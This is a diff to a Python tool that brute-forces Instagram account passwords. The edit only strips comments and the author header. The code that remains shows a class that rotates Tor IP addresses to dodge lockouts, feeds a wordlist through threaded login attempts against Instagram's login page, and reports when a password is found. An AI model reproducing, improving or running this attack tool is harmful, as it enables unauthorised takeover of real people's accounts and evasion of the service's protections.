@@ -1,9 +1,4 @@
 # Date: 19/04/2018
-# Distro: Kali Linux
-# Author: Lester :)
-# Description: Bruteforce Instagram
-#
-#
 
 import os
 import time
@@ -21,14 +16,14 @@ class Instagram(TorManager,Browser):
   self.wordlist = wordlist
   self.lock = threading.Lock()
 
-  self.ip = None # current ip address
+  self.ip = None
   self.tries = 0
-  self.wait = False # wait for connection
-  self.alive = True # is bruter still running
-  self.isFound = False # is the password found?
+  self.wait = False 
+  self.alive = True 
+  self.isFound = False 
 
-  self.passlist = [] # temporary storage; holds a max of 5 passwords
-  self.recentIps = [] # temporary storage; holds a max of 5 ip addresses
+  self.passlist = [] 
+  self.recentIps = []
 
   # for browser
   self.url = 'https://www.instagram.com/accounts/login/?force_classic_login'
@@ -38,11 +33,11 @@ class Instagram(TorManager,Browser):
   Browser.__init__(self)
   TorManager.__init__(self)
 
-  self.n = '\033[0m'  # null ---> reset
-  self.r = '\033[31m' # red
-  self.g = '\033[32m' # green
-  self.y = '\033[33m' # yellow
-  self.b = '\033[34m' # blue
+  self.n = '\033[0m'  
+  self.r = '\033[31m' 
+  self.g = '\033[32m' 
+  self.y = '\033[33m'
+  self.b = '\033[34m' 
 
  def kill(self,msg=None):
   self.alive = False
@@ -100,7 +95,7 @@ class Instagram(TorManager,Browser):
      self.passlist.append(pwd)
     else:
      while all([self.alive,len(self.passlist)]):pass
-     if not len(self.passlist): # just making sure, because self.alive could be false
+     if not len(self.passlist): 
       self.passlist.append(pwd)
 
   # done reading file
@@ -140,7 +135,7 @@ class Instagram(TorManager,Browser):
   time.sleep(1.3)
   threading.Thread(target=self.setupPasswords).start()
   while self.alive:
-   bot = None # workers
+   bot = None 
 
    for pwd in self.passlist:
     bot = threading.Thread(target=self.attempt,args=[pwd])
@@ -155,7 +150,7 @@ class Instagram(TorManager,Browser):
  def display(self,pwd=None):
   pwd = pwd if pwd else ''
   ip = self.ip if self.ip else ''
-  creds = self.r if not self.isFound else self.g # credentials color
+  creds = self.r if not self.isFound else self.g 
   attempts = self.tries if self.tries else ''
 
   subprocess.call(['clear'])
